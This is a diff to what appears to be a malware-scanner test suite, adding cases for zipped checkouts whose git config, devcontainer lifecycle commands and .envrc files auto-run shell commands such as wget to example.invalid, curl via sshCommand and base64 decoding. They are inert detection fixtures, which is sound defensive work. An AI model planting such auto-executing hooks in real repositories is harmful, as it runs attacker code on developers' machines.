@@ -365,6 +365,84 @@ def cases() -> list[tuple[str, bytes, str | None]]:
         ("binbytes-arg.pkl", _binbytes_argument_pickle(), "heuristic_pickle_reduce"),
         ("model.pt", _zip("data.pkl", _dangerous_pickle()), "heuristic_pickle_reduce"),
         ("note.pkl", pickle.dumps({"note": "hello"}, protocol=4), None),
+        # A zipped checkout: the member's own name reaches the name-scoped rules.
+        (
+            "repo-git.zip",
+            _zip("repo/.git/config", b"[core]\n\tsshCommand = sh -c 'curl -fsS x'\n"),
+            "dev_git_config_exec",
+        ),
+        (
+            "repo-devcontainer.zip",
+            _zip(
+                "repo/.devcontainer/devcontainer.json",
+                b'{"initializeCommand": "wget -qO /tmp/i https://example.invalid/i"}',
+            ),
+            "dev_devcontainer_lifecycle",
+        ),
+        (
+            "repo-envrc.zip",
+            _zip("repo/.envrc", b"echo aW5lcnQ= | base64 -d > /tmp/x\n"),
+            "dev_envrc_exec",
+        ),
+        (
+            "repo-ok.zip",
+            _zip("repo/.envrc", b"use flake\n"),
+            None,
+        ),
+        # Codex review of #160: keys belong to their own section, values end at their string,
+        # pretty-printed objects and arrays are read, and a backslash member path is a path.
+        (
+            "alias.config",
+            b"[core]\n\tbare = false\n[alias]\n\tprocess = !sh -c 'git add -A'\n",
+            None,
+        ),
+        (
+            "devcontainer.json",
+            b'{"initializeCommand":"mkdir -p .cache","postCreateCommand":"wget -qO /tmp/i x"}',
+            None,
+        ),
+        (
+            "obj-devcontainer.zip",
+            _zip(
+                "repo/.devcontainer/devcontainer.json",
+                b'{\n  "initializeCommand": {\n    "prepare": "wget -qO /tmp/i https://example.invalid/i"'
+                b"\n  }\n}\n",
+            ),
+            "dev_devcontainer_lifecycle",
+        ),
+        (
+            "array-devcontainer.zip",
+            _zip(
+                "repo/.devcontainer/devcontainer.json",
+                b'{\n  "initializeCommand": [\n    "sh",\n    "-c",\n'
+                b'    "wget -qO /tmp/i https://example.invalid/i"\n  ]\n}\n',
+            ),
+            "dev_devcontainer_lifecycle",
+        ),
+        (
+            "backslash-devcontainer.zip",
+            _zip(
+                "repo\\.devcontainer\\devcontainer.json",
+                b'{"initializeCommand": "wget -qO /tmp/i https://example.invalid/i"}',
+            ),
+            "dev_devcontainer_lifecycle",
+        ),
+        (
+            "trailing-dot-devcontainer.zip",
+            _zip(
+                "repo/.devcontainer/devcontainer.json. ",
+                b'{"initializeCommand": "wget -qO /tmp/i https://example.invalid/i"}',
+            ),
+            "dev_devcontainer_lifecycle",
+        ),
+        (
+            "trailing-dot-envrc.zip",
+            _zip("repo/.envrc.", b"echo aW5lcnQ= | base64 -d > /tmp/x\n"),
+            "dev_envrc_exec",
+        ),
+        # The same bytes under another name are not a dev container or direnv file.
+        ("init.json", b'{"initializeCommand": "wget -qO /tmp/i https://example.invalid/i"}', None),
+        ("envrc.sh", b"echo aW5lcnQ= | base64 -d > /tmp/x\n", None),
         *_pickle_walker_cases(),
         ("ok.safetensors", _safetensors(True), None),
         ("bad.safetensors", _safetensors(False), "heuristic_safetensors_header"),
